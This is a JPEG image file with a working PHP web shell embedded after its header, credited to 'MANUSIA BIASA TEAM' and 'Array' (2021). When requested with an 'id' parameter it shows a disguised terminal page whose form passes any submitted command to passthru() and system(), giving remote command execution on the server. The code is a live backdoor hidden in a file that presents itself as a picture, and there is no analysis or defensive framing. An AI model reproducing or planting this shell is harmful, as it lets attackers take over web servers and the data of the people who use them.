���� JFIF      �� 4<?php
if(isset($_REQUEST['id'])){
echo '<title>Terminal Linux</title><style type="text/css">
body{
font-family:Courier;
background:black;
background-size:cover;
background-attachment:fixed;
background-repeat:no-repeat;
}
input{
border:black solid;
color:green;
background:transparent;
}
</style><hr color="green">';
echo '<font color="green"><pre>';
echo '<b><br><center>MANUSIA BIASA TEAM MINI SHELL BACKDOOR EXECUTE</center><form action="" method="post"><input type="text" name="cmd" placeholder="ketik commandnya disini bang"><input type="submit" value=">>"></form><br>';
$cmd = passthru($_POST['cmd']);
system($cmd);
echo '</pre>';
echo '<hr color="green"><center>C0ded by Array &copy; 2021';
die;
} __halt_compiler();
�� C 	

			

		


�� C	��    ��                 ��                 ��               ��                 ��   ? �P?��